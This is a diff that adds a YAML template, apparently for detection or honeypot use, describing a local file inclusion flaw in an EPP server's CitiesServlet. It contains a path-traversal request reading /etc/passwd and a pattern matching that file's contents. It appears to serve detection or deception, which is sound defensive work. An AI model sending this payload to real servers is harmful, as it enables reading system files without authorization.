@@ -1,0 +1,27 @@
+id: epp-server-lfi
+info:
+  name: EPP Server - Local File Inclusion
+  author: DhiyaneshDK
+  description: 'servlet called "CitiesServlet" that handles HTTP GET requests, so
+    the user-provided input, obtained from the country parameter, is directly concatenated
+    with the "/cities/cities_" string to form the fileName, This means an attacker
+    can manipulate the country parameter and potentially access arbitrary files on
+    the server''s file system
+
+    '
+  severity: high
+  reference:
+  - https://hackcompute.com/hacking-epp-servers/
+  metadata:
+    max-request: 1
+  tags: epp,cocca,registry
+traps:
+- request:
+    method: GET
+    path: /cities?country=/../../../../../../../../etc/passwd
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: 'root:.*:0:0:'
